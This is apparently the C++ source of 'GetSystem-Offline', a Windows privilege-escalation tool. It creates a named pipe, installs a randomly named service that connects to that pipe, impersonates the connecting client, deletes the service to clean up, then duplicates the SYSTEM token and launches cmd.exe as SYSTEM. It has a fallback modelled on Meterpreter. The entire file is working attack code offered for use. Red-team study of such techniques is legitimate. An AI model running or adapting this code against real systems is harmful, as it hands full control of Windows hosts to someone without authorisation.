// elevate.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#define SERVICE_EXE "getsystem_service.exe"
#define SERVICE_NAME "Elevate"
#define PIPE_PATH "\\\\.\\pipe\\elevate"

void PrintIntro(void) {
	printf("\n GetSystem-Offline\n\tcreated by @_xpn_\n\n");
}

int main()
{
	char directory[_MAX_PATH];
	char servicePath[_MAX_PATH];
	char serviceName[128];
	char recv[1024];
	DWORD bytes;
	bool connected;
	HINSTANCE hinst;
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	HANDLE token;
	HANDLE newtoken;
	HANDLE ptoken;

	PrintIntro();

	HANDLE namedPipe = CreateNamedPipeA(PIPE_PATH, 
		PIPE_ACCESS_DUPLEX, 
		PIPE_TYPE_MESSAGE | PIPE_WAIT, 
		PIPE_UNLIMITED_INSTANCES, 
		1024, 
		1024, 
		0, 
		NULL
		);

	if (namedPipe == INVALID_HANDLE_VALUE) {
		printf("[!] Could not create named pipe\n");
		return 0;
	}
	else {
		printf("[*] Named pipe created: %s\n", PIPE_PATH);
	}
	
	srand(GetTickCount());
	GetModuleFileNameA(LoadLibraryA(SERVICE_EXE), servicePath, sizeof(servicePath));
	snprintf(serviceName, sizeof(serviceName), "%s%d%d", SERVICE_NAME, rand(), rand());

	printf("[*] Creating service %s\n", serviceName);

	if (!ServiceInstall(servicePath, serviceName)) {
		printf("[!] Error creating service\n");
		return 0;
	}
	else {
		printf("[*] Service installed (%s)\n", serviceName);
	}

	if (!ServiceStart(serviceName)) {
		printf("[!] Error starting service\n");
		return 0;
	}
	else {
		printf("[*] Service started (%s)\n", serviceName);
	}

	connected = ConnectNamedPipe(namedPipe, NULL) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);
	
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	if (connected) {
		for (;;) {
			printf("[*] Waiting for pipe connection...\n");

			ZeroMemory(recv, sizeof(recv));

			// We need to read data before Windows allows us to impersonate the caller
			ReadFile(namedPipe, recv, sizeof(recv), &bytes, NULL);

			printf("[*] Read %d Bytes: %s\n", bytes, recv);

			printf("[*] Attempting to impersonate client\n");
			if (ImpersonateNamedPipeClient(namedPipe) == 0) {
				printf("[!] Error impersonating client\n");
				return 0;
			}

			// We no longer need the service
			if (!ServiceStop(serviceName)) {
				printf("[!] Error stopping service\n");
			}
			else {
				printf("[*] Service cleaned up\n");
			}

			if (!ServiceDelete(serviceName)) {
				printf("[!] Error deleting service\n");
				printf("[!] Please manually remove service using 'sc delete %s'", serviceName);
			}

			
			if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &token)) {
				printf("[!] Error opening thread token\n");
			} 

			if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &ptoken)) {
				printf("[!] Error opening process token\n");
			}
			

			if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &newtoken)) {
				printf("[!] Error duplicating thread token\n");
			}
			
			printf("[*] Impersonated SYSTEM user successfully\n");
			if (!CreateProcessAsUserA(newtoken, NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
				printf("[!] CreateProcessAsUser failed (%d), trying another method.\n", GetLastError());

				ZeroMemory(&si, sizeof(si));
				si.cb = sizeof(si);
				ZeroMemory(&pi, sizeof(pi));

				// Sometimes we fail above (as shown at meterpreter/source/extensions/stdapi/server/sys/process/process.c)
				if (!CreateProcessWithTokenW(newtoken, LOGON_NETCREDENTIALS_ONLY, NULL, L"cmd.exe", NULL, NULL, NULL, (LPSTARTUPINFOW)&si, &pi)) {
					printf("[!] CreateProcessWithToken failed (%d).\n", GetLastError());
					return 0;
				}
			}

			printf("[*] All Done.. enjoy... press any key to finish\n");
			getchar();

			return 0;
		}
		
	}
    return 0;
}

